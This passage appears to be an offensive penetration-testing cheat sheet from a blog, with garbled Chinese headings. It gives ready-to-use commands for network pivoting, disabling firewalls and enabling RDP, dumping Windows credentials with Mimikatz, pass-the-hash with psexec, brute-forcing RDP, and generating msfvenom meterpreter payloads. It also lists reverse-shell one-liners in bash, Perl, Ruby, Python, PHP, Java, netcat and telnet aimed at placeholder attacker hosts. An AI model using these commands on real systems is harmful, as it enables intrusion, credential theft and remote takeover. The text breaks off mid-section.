class="headerlink" title="SSH ç©¿é€"></a>SSH ç©¿é€</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">ssh -D 127.0.0.1:1080 -p 22 user@IP</div><div class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</div><div class="line">proxychains commands target</div></pre></div></div></figure><h2 id="SSH-ç©¿é€ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œ"><a href="#SSH-ç©¿é€ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œ" class="headerlink" title="SSH ç©¿é€ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œ"></a>SSH ç©¿é€ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œ</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">ssh -D 127.0.0.1:1080 -p 22 user1@IP1</div><div class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</div><div class="line">proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2</div><div class="line">Add socks4 127.0.0.1 1081 in /etc/proxychains.conf</div><div class="line">proxychains commands target</div></pre></div></div></figure><h2 id="ä½¿ç”¨-metasploit-è¿›è¡Œç©¿é€"><a href="#ä½¿ç”¨-metasploit-è¿›è¡Œç©¿é€" class="headerlink" title="ä½¿ç”¨ metasploit è¿›è¡Œç©¿é€"></a>ä½¿ç”¨ metasploit è¿›è¡Œç©¿é€</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line">route add X.X.X.X 255.255.255.0 1</div><div class="line">use auxiliary/server/socks4a</div><div class="line">run</div><div class="line">proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</div><div class="line"></div><div class="line">æˆ–è€…</div><div class="line"></div><div class="line">meterpreter &gt; ipconfig</div><div class="line">IP Address  : 10.1.13.3</div><div class="line">meterpreter &gt; run autoroute -s 10.1.13.0/24</div><div class="line">meterpreter &gt; run autoroute -p</div><div class="line">10.1.13.0          255.255.255.0      Session 1</div><div class="line">meterpreter &gt; Ctrl+Z</div><div class="line">msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec</div><div class="line">msf exploit(psexec) &gt; set RHOST 10.1.13.2</div><div class="line">msf exploit(psexec) &gt; exploit</div><div class="line">meterpreter &gt; ipconfig</div><div class="line">IP Address  : 10.1.13.2</div></pre></div></div></figure><h2 id="å¼€å¯-RDP-æœåŠ¡"><a href="#å¼€å¯-RDP-æœåŠ¡" class="headerlink" title="å¼€å¯ RDP æœåŠ¡"></a>å¼€å¯ RDP æœåŠ¡</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0</div><div class="line">netsh firewall set service remoteadmin enable</div><div class="line">netsh firewall set service remotedesktop enable</div></pre></div></div></figure><h2 id="å…³é—­-Windows-é˜²ç«å¢™"><a href="#å…³é—­-Windows-é˜²ç«å¢™" class="headerlink" title="å…³é—­ Windows é˜²ç«å¢™"></a>å…³é—­ Windows é˜²ç«å¢™</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">netsh firewall set opmode disable</div></pre></div></div></figure><h2 id="Meterpreter-VNC-RDP"><a href="#Meterpreter-VNC-RDP" class="headerlink" title="Meterpreter VNC\RDP"></a>Meterpreter VNC\RDP</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">run getgui -u admin -p 1234</div><div class="line">run vnc -p 5043</div></pre></div></div></figure><h2 id="ä½¿ç”¨-Mimikatzè·å–-Windows-æ˜æ–‡ç”¨æˆ·åå¯†ç "><a href="#ä½¿ç”¨-Mimikatzè·å–-Windows-æ˜æ–‡ç”¨æˆ·åå¯†ç " class="headerlink" title="ä½¿ç”¨ Mimikatzè·å– Windows æ˜æ–‡ç”¨æˆ·åå¯†ç "></a>ä½¿ç”¨ Mimikatzè·å– Windows æ˜æ–‡ç”¨æˆ·åå¯†ç </h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/gentilkiwi/mimikatz.git</div><div class="line">privilege::debug</div><div class="line">sekurlsa::logonPasswords full</div><div class="line">è·å–å“ˆå¸Œå€¼</div><div class="line"></div><div class="line">git clone https://github.com/byt3bl33d3r/pth-toolkit</div><div class="line">pth-winexe -U hash //IP cmd</div><div class="line"></div><div class="line">æˆ–è€…</div><div class="line"></div><div class="line">apt-get install freerdp-x11</div><div class="line">xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</div><div class="line"></div><div class="line">åœ¨æˆ–è€…</div><div class="line"></div><div class="line">meterpreter &gt; run post/windows/gather/hashdump</div><div class="line">Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</div><div class="line">msf &gt; use exploit/windows/smb/psexec</div><div class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</div><div class="line">msf exploit(psexec) &gt; exploit</div><div class="line">meterpreter &gt; shell</div></pre></div></div></figure><h2 id="ä½¿ç”¨-Hashcat-ç ´è§£å¯†ç "><a href="#ä½¿ç”¨-Hashcat-ç ´è§£å¯†ç " class="headerlink" title="ä½¿ç”¨ Hashcat ç ´è§£å¯†ç "></a>ä½¿ç”¨ Hashcat ç ´è§£å¯†ç </h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">hashcat -m 400 -a 0 hash /root/rockyou.txt</div></pre></div></div></figure><h2 id="ä½¿ç”¨-NC-æŠ“å–-Banner-ä¿¡æ¯"><a href="#ä½¿ç”¨-NC-æŠ“å–-Banner-ä¿¡æ¯" class="headerlink" title="ä½¿ç”¨ NC æŠ“å– Banner ä¿¡æ¯"></a>ä½¿ç”¨ NC æŠ“å– Banner ä¿¡æ¯</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">nc 192.168.0.10 80</div><div class="line">GET / HTTP/1.1</div><div class="line">Host: 192.168.0.10</div><div class="line">User-Agent: Mozilla/4.0</div><div class="line">Referrer: www.example.com</div></pre></div></div></figure><h2 id="æŸ¥æ‰¾-SUID-SGID-root-æ–‡ä»¶"><a href="#æŸ¥æ‰¾-SUID-SGID-root-æ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾ SUID\SGID root æ–‡ä»¶"></a>æŸ¥æ‰¾ SUID\SGID root æ–‡ä»¶</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"># æŸ¥æ‰¾ SUID root æ–‡ä»¶</div><div class="line">find / -user root -perm -4000 -print</div><div class="line"></div><div class="line"># æŸ¥æ‰¾ SGID root æ–‡ä»¶:</div><div class="line">find / -group root -perm -2000 -print</div><div class="line"></div><div class="line"># æŸ¥æ‰¾ SUID å’Œ SGID æ–‡ä»¶:</div><div class="line">find / -perm -4000 -o -perm -2000 -print</div><div class="line"></div><div class="line"># æŸ¥æ‰¾ä¸å±äºä»»ä½•ç”¨æˆ·çš„æ–‡ä»¶:</div><div class="line">find / -nouser -print</div><div class="line"></div><div class="line"># æŸ¥æ‰¾ä¸å±äºä»»ä½•ç”¨æˆ·ç»„çš„æ–‡ä»¶:</div><div class="line">find / -nogroup -print</div><div class="line"></div><div class="line"># æŸ¥æ‰¾è½¯è¿æ¥åŠå…¶æŒ‡å‘:</div><div class="line">find / -type l -ls</div></pre></div></div></figure><h2 id="è·å–è¿›ç¨‹å¯¹åº”çš„-PID"><a href="#è·å–è¿›ç¨‹å¯¹åº”çš„-PID" class="headerlink" title="è·å–è¿›ç¨‹å¯¹åº”çš„ PID"></a>è·å–è¿›ç¨‹å¯¹åº”çš„ PID</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">fuser -nv tcp 80</div><div class="line">fuser -k -n tcp 80</div></pre></div></div></figure><h2 id="ä½¿ç”¨-Hydra-çˆ†ç ´-RDP"><a href="#ä½¿ç”¨-Hydra-çˆ†ç ´-RDP" class="headerlink" title="ä½¿ç”¨ Hydra çˆ†ç ´ RDP"></a>ä½¿ç”¨ Hydra çˆ†ç ´ RDP</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</div></pre></div></div></figure><h2 id="æŒ‚è½½è¿œç¨‹-Windows-å…±äº«æ–‡ä»¶å¤¹"><a href="#æŒ‚è½½è¿œç¨‹-Windows-å…±äº«æ–‡ä»¶å¤¹" class="headerlink" title="æŒ‚è½½è¿œç¨‹ Windows å…±äº«æ–‡ä»¶å¤¹"></a>æŒ‚è½½è¿œç¨‹ Windows å…±äº«æ–‡ä»¶å¤¹</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</div></pre></div></div></figure><h2 id="Kali-ä¸‹ç¼–è¯‘-Exploit"><a href="#Kali-ä¸‹ç¼–è¯‘-Exploit" class="headerlink" title="Kali ä¸‹ç¼–è¯‘ Exploit"></a>Kali ä¸‹ç¼–è¯‘ Exploit</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">gcc -m32 -o output32 hello.c (32 ä½)</div><div class="line">gcc -m64 -o output hello.c (64 ä½)</div></pre></div></div></figure><h2 id="Kali-ä¸‹ç¼–è¯‘-Windows-Exploit"><a href="#Kali-ä¸‹ç¼–è¯‘-Windows-Exploit" class="headerlink" title="Kali ä¸‹ç¼–è¯‘ Windows Exploit"></a>Kali ä¸‹ç¼–è¯‘ Windows Exploit</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</div><div class="line">wine mingw-get-setup.exe</div><div class="line">select mingw32-base</div><div class="line">cd /root/.wine/drive_c/windows</div><div class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</div><div class="line">cd /root/.wine/drive_c/MinGW/bin</div><div class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</div><div class="line">wine ability.exe</div></pre></div></div></figure><h2 id="NASM-å‘½ä»¤"><a href="#NASM-å‘½ä»¤" class="headerlink" title="NASM å‘½ä»¤"></a>NASM å‘½ä»¤</h2><blockquote><p>NASM å…¨ç§° The Netwide Assemblerï¼Œæ˜¯ä¸€æ¬¾åŸºäº80Ã—86å’Œx86-64å¹³å°çš„æ±‡ç¼–è¯­è¨€ç¼–è¯‘ç¨‹åºï¼Œå…¶è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†å®ç°ç¼–è¯‘å™¨ç¨‹åºè·¨å¹³å°å’Œæ¨¡å—åŒ–çš„ç‰¹æ€§ã€‚</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">nasm -f bin -o payload.bin payload.asm</div><div class="line">nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</div></pre></div></div></figure><h2 id="åŸºäº-CSV-æ–‡ä»¶æŸ¥è¯¢-Exploit-DB"><a href="#åŸºäº-CSV-æ–‡ä»¶æŸ¥è¯¢-Exploit-DB" class="headerlink" title="åŸºäº CSV æ–‡ä»¶æŸ¥è¯¢ Exploit-DB"></a>åŸºäº CSV æ–‡ä»¶æŸ¥è¯¢ Exploit-DB</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/offensive-security/exploit-database.git</div><div class="line">cd exploit-database</div><div class="line">./searchsploit â€“u</div><div class="line">./searchsploit apache 2.2</div><div class="line">./searchsploit &quot;Linux Kernel&quot;</div><div class="line"></div><div class="line">cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3</div></pre></div></div></figure><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="ä½¿ç”¨-NC-åœ¨-Windows-ä¸Šåå¼¹-shell"><a href="#ä½¿ç”¨-NC-åœ¨-Windows-ä¸Šåå¼¹-shell" class="headerlink" title="ä½¿ç”¨ NC åœ¨ Windows ä¸Šåå¼¹ shell"></a>ä½¿ç”¨ NC åœ¨ Windows ä¸Šåå¼¹ shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">c:&gt;nc -Lp 31337 -vv -e cmd.exe</div><div class="line">nc 192.168.0.10 31337</div><div class="line">c:&gt;nc example.com 80 -e cmd.exe</div><div class="line">nc -lp 80</div><div class="line"></div><div class="line">nc -lp 31337 -e /bin/bash</div><div class="line">nc 192.168.0.10 31337</div><div class="line">nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000</div></pre></div></div></figure><h3 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</div></pre></div></div></figure><h3 id="Python-Ruby-PHP-HTTP-æœåŠ¡å™¨"><a href="#Python-Ruby-PHP-HTTP-æœåŠ¡å™¨" class="headerlink" title="Python\Ruby\PHP HTTP æœåŠ¡å™¨"></a>Python\Ruby\PHP HTTP æœåŠ¡å™¨</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">python2 -m SimpleHTTPServer</div><div class="line">python3 -m http.server</div><div class="line"></div><div class="line">ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :D</div><div class="line"> ocumentRoot =&gt; Dir.pwd).start&quot;</div><div class="line">php -S 0.0.0.0:8888</div></pre></div></div></figure><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe</div><div class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</div></pre></div></div></figure><h3 id="MSF-ç”Ÿæˆåœ¨-Linux-ä¸‹åå¼¹çš„-Meterpreter-Shell"><a href="#MSF-ç”Ÿæˆåœ¨-Linux-ä¸‹åå¼¹çš„-Meterpreter-Shell" class="headerlink" title="MSF ç”Ÿæˆåœ¨ Linux ä¸‹åå¼¹çš„ Meterpreter Shell"></a>MSF ç”Ÿæˆåœ¨ Linux ä¸‹åå¼¹çš„ Meterpreter Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</div></pre></div></div></figure><h3 id="MSF-ç”Ÿæˆåå¼¹-Shell-C-Shellcode"><a href="#MSF-ç”Ÿæˆåå¼¹-Shell-C-Shellcode" class="headerlink" title="MSF ç”Ÿæˆåå¼¹ Shell (C Shellcode)"></a>MSF ç”Ÿæˆåå¼¹ Shell (C Shellcode)</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</div></pre></div></div></figure><h3 id="MSF-ç”Ÿæˆåå¼¹-Python-Shell"><a href="#MSF-ç”Ÿæˆåå¼¹-Python-Shell" class="headerlink" title="MSF ç”Ÿæˆåå¼¹ Python Shell"></a>MSF ç”Ÿæˆåå¼¹ Python Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</div></pre></div></div></figure><h3 id="MSF-ç”Ÿæˆåå¼¹-ASP-Shell"><a href="#MSF-ç”Ÿæˆåå¼¹-ASP-Shell" class="headerlink" title="MSF ç”Ÿæˆåå¼¹ ASP Shell"></a>MSF ç”Ÿæˆåå¼¹ ASP Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</div></pre></div></div></figure><h3 id="MSF-ç”Ÿæˆåå¼¹-Bash-Shell"><a href="#MSF-ç”Ÿæˆåå¼¹-Bash-Shell" class="headerlink" title="MSF ç”Ÿæˆåå¼¹ Bash Shell"></a>MSF ç”Ÿæˆåå¼¹ Bash Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</div></pre></div></div></figure><h3 id="MSF-ç”Ÿæˆåå¼¹-PHP-Shell"><a href="#MSF-ç”Ÿæˆåå¼¹-PHP-Shell" class="headerlink" title="MSF ç”Ÿæˆåå¼¹ PHP Shell"></a>MSF ç”Ÿæˆåå¼¹ PHP Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php</div><div class="line">add &lt;?php at the beginning</div><div class="line">perl -i~ -0777pe&apos;s/^/&lt;?php \n/&apos; shell.php</div></pre></div></div></figure><h3 id="MSF-ç”Ÿæˆåå¼¹-Win-Shell"><a href="#MSF-ç”Ÿæˆåå¼¹-Win-Shell" class="headerlink" title="MSF ç”Ÿæˆåå¼¹ Win Shell"></a>MSF ç”Ÿæˆåå¼¹ Win Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</div></pre></div></div></figure><h3 id="BASH-åå¼¹-Shell"><a href="#BASH-åå¼¹-Shell" class="headerlink" title="BASH åå¼¹ Shell"></a>BASH åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1</div><div class="line"></div><div class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</div><div class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</div><div class="line"></div><div class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</div><div class="line"></div><div class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</div><div class="line"></div><div class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</div><div class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444</div><div class="line"></div><div class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:</div><div class="line">while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</div><div class="line"></div><div class="line">/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1</div><div class="line">/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</div></pre></div></div></figure><h3 id="PERL-åå¼¹-Shell"><a href="#PERL-åå¼¹-Shell" class="headerlink" title="PERL åå¼¹ Shell"></a>PERL åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div><div class="line"></div><div class="line"># Win å¹³å°</div><div class="line">perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;â€™</div></pre></div></div></figure><h3 id="RUBY-åå¼¹-Shell"><a href="#RUBY-åå¼¹-Shell" class="headerlink" title="RUBY åå¼¹ Shell"></a>RUBY åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div><div class="line"></div><div class="line"># Win å¹³å°</div><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div><div class="line">ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></div></div></figure><h3 id="PYTHON-åå¼¹-Shell"><a href="#PYTHON-åå¼¹-Shell" class="headerlink" title="PYTHON åå¼¹ Shell"></a>PYTHON åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></div></div></figure><h3 id="PHP-åå¼¹-Shell"><a href="#PHP-åå¼¹-Shell" class="headerlink" title="PHP åå¼¹ Shell"></a>PHP åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></div></div></figure><h3 id="JAVA-åå¼¹-Shell"><a href="#JAVA-åå¼¹-Shell" class="headerlink" title="JAVA åå¼¹ Shell"></a>JAVA åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</div><div class="line">p.waitFor()</div></pre></div></div></figure><h3 id="NETCAT-åå¼¹-Shell"><a href="#NETCAT-åå¼¹-Shell" class="headerlink" title="NETCAT åå¼¹ Shell"></a>NETCAT åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">nc -e /bin/sh attackerip 4444</div><div class="line">nc -e /bin/sh 192.168.37.10 443</div><div class="line"></div><div class="line"># å¦‚æœ -e å‚æ•°è¢«ç¦ç”¨ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹å‘½ä»¤</div><div class="line"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</div><div class="line">/bin/sh | nc attackerip 443</div><div class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/</div><div class="line"></div><div class="line"># å¦‚æœä½ å®‰è£…é”™äº† netcat çš„ç‰ˆæœ¬ï¼Œè¯·å°è¯•ä»¥ä¸‹å‘½ä»¤</div><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</div></pre></div></div></figure><h3 id="TELNET-åå¼¹-Shell"><a href="#TELNET-åå¼¹-Shell" class="headerlink" title="TELNET åå¼¹ Shell"></a>TELNET åå¼¹ Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"># å¦‚æœ netcat ä¸å¯ç”¨æˆ–è€… /dev/tcp</div><div class="line">mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></div></div></figure><h3 id="XTERM-åå¼¹-Shell"><a href="#XTERM-åå¼¹-Shell" class="headerlink" title="XTERM åå¼¹ Shell"></a>XTERM åå¼¹ 